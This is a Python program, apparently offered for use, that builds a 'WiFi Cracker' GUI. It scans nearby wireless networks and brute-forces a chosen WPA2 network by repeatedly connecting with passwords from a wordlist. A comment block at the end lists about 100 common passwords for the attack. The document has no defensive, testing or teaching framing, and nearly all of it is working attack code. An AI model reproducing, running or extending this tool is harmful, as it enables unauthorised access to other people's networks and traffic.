# note : first create a txt file the same directory in which every password you can think it can be 
# line by line note: in the end of the code i have given top 100 passwords used in 2024 

import tkinter as tk
from tkinter import messagebox, filedialog
import pywifi
from pywifi import const
import time
import threading

class WiFiCrackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Cracker")
        
        # Create UI elements
        self.scan_button = tk.Button(root, text="Scan Networks", command=self.scan_networks)
        self.scan_button.pack(pady=10)
        
        self.network_listbox = tk.Listbox(root, selectmode=tk.SINGLE)
        self.network_listbox.pack(pady=10, padx=10)
        
        self.select_button = tk.Button(root, text="Select Network", command=self.select_network)
        self.select_button.pack(pady=10)
        
        self.password_file_button = tk.Button(root, text="Select Password File", command=self.select_password_file)
        self.password_file_button.pack(pady=10)
        
        self.password_file = None
        self.selected_ssid = None
        self.thread = None

    def scan_networks(self):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(1)  # Wait for the scan to complete
        networks = iface.scan_results()
        
        self.network_listbox.delete(0, tk.END)
        for network in networks:
            self.network_listbox.insert(tk.END, network.ssid)

    def select_network(self):
        selected_index = self.network_listbox.curselection()
        if not selected_index:
            messagebox.showwarning("Warning", "Please select a network.")
            return
        
        self.selected_ssid = self.network_listbox.get(selected_index)
        if not self.password_file:
            messagebox.showwarning("Warning", "Please select a password file.")
            return

        # Start password cracking in a separate thread
        if self.thread and self.thread.is_alive():
            messagebox.showinfo("Info", "Password cracking is already in progress.")
            return
        
        self.thread = threading.Thread(target=self.crack_password, args=(self.selected_ssid, self.password_file))
        self.thread.start()

    def select_password_file(self):
        self.password_file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.password_file:
            print(f"Selected password file: {self.password_file}")

    def connect_to_wifi(self, ssid, password):
        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.disconnect()
            time.sleep(1)  # Allow time for disconnection
            
            if iface.status() == const.IFACE_DISCONNECTED:
                profile = pywifi.Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = password
                
                iface.remove_all_network_profiles()
                temp_profile = iface.add_network_profile(profile)
                
                iface.connect(temp_profile)
                start_time = time.time()
                
                while time.time() - start_time < 10:  # Increased connection timeout
                    status = iface.status()
                    if status == const.IFACE_CONNECTED:
                        print(f"Successfully connected to {ssid} with password: {password}")
                        return True
                    time.sleep(1)
                
                iface.disconnect()
                time.sleep(1)
            
            return False

        except Exception as e:
            print(f"Error during connection attempt: {e}")
            return False

    def crack_password(self, ssid, password_list_file):
        def attempt_password(password):
            password = password.strip()
            print(f"Trying password: {password}")  # Print each password being tested
            if self.connect_to_wifi(ssid, password):
                self.show_result(f"Password cracked successfully with: {password}")
                return True
            return False

        # Open the password file and batch process 5 passwords at a time
        with open(password_list_file, 'r') as passwords:
            password_batch = []
            for password in passwords:
                password_batch.append(password.strip())

                # If we have a batch of 5 passwords, try them
                if len(password_batch) == 5:
                    for pw in password_batch:
                        if attempt_password(pw):
                            return

                    # Clear the batch and wait before proceeding to the next batch
                    password_batch = []
                    print("Waiting before trying the next batch of passwords...")
                    time.sleep(2)

            # Check if there are any remaining passwords in the batch
            if password_batch:
                for pw in password_batch:
                    if attempt_password(pw):
                        return

        self.show_result("Failed to crack the password.")

    def show_result(self, message):
        messagebox.showinfo("Result", message)

# Set up the Tkinter GUI
root = tk.Tk()
app = WiFiCrackerApp(root)

root.mainloop()

# 123456
# password
# 123456789
# 12345678
# qwerty
# 1234567
# 1234567890
# 123123
# 111111
# abc123
# qwerty123
# india123
# 987654321
# 12345
# 0987654321
# password123
# iloveyou
# 123321
# asdfgh
# qwertyuiop
# 123qwe
# sunshine
# 1qaz2wsx
# letmein
# admin
# 654321
# freedom
# welcome
# 121212
# 1234
# master
# qazwsx
# football
# mumbai123
# superman
# trustno1
# hello123
# naruto123
# monkey
# 112233
# prince123
# rajesh123
# batman123
# chennai123
# 123987
# a1b2c3
# 987123
# dragon
# abcd1234
# happy123
# delhi123
# rocky123
# 1q2w3e4r
# 7777777
# chocolate
# flower123
# password1
# cricket123
# omkar123
# harry123
# pooja123
# shiva123
# ganesh123
# sneha123
# babaji123
# lucky123
# tiger123
# vishal123
# rajeshkumar
# surya123
# winner123
# p@ssw0rd
# sachin123
# 654123
# 123456a
# 1password
# ram123
# lucky1234
# 999999
# vijay123
# krishna123
# rohit123
# kunal123
# amit123
# jamesbond
# surya007
# ajay123
# simple123
# india2020
# love123
# royal123
# alpha123
# india2019
# power123
# apple123
# india987
# success123
# kalpesh123
# vivek123
# secret123
